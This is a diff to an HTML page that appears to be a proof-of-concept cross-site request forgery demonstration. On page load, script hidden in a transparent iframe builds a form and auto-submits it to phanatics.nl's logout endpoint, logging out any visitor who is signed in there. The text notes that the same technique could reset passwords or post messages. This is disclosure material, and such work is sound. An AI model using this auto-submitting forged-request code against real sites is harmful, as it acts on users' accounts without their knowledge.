@@ -3,20 +3,39 @@
 
 <head>
     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <style>
+body {
+    max-width   : 550px;
+    margin      : 40px 20px;
+    font-family : Ubuntu, sans-serif;
+    font-size   : 14px;
+    line-height : 24px;
+}
+h1 {
+    font-style  : italic;
+}
+address {
+    text-align  : right;
+}
+    </style>
     <script src="http://code.jquery.com/jquery-1.4.4.min.js"></script>
     <script>
+var loaded = false;
 $(document).ready(function() {
+    // Firefox doesn't load the iframe contents if we use display:none
     $('body').append(
-        $('<iframe style="display:none" id="iframe" name="iframe" src="about:blank" onload="iframe_load()">')
+        $('<iframe style="opacity:0" id="iframe" name="iframe" src="about:blank" onload="iframe_load()">')
     );
 });
 function iframe_load() {
+    if (loaded) return; // Prevent running on remote site
     var doc = $('#iframe').contents()[0];
     $(doc.body).html(
         '<form id="logform" name="logform" action="http://phanatics.nl/index.php?cat=log" method="post">' +
         '<input id="logOut" name="logOut" type="submit" value="log uit"></form>'
     );
     // TODO: There must be a way to remove the onload handler from the iframe
+    loaded = true;
     $(doc).find('#logOut').click();
 }
     </script>
@@ -36,14 +55,15 @@ to make a request to the <a href="http://phanatics.nl">Phanatics
 <p>
 If you are currently logged in on the Phanatics website, you will be
 logged out after visiting this page. Implementation is with Javascript
-and a hidden IFrame.
+and a hidden IFrame. Tested in Chrome 8 beta, Firefox 3.6, and Firefox
+4.0 beta.
 
 <p>
 Note that this is just a relatively harmless proof of concept. The
 same technique can be used e.g. to reset your password, or to post a
-forum message.
+forum message. Many sites are vulnerable to this attack.
 
-<p>
+<address>
 <a href="http://martijn.vermaat.name">Martijn Vermaat</a>
 
 </body>
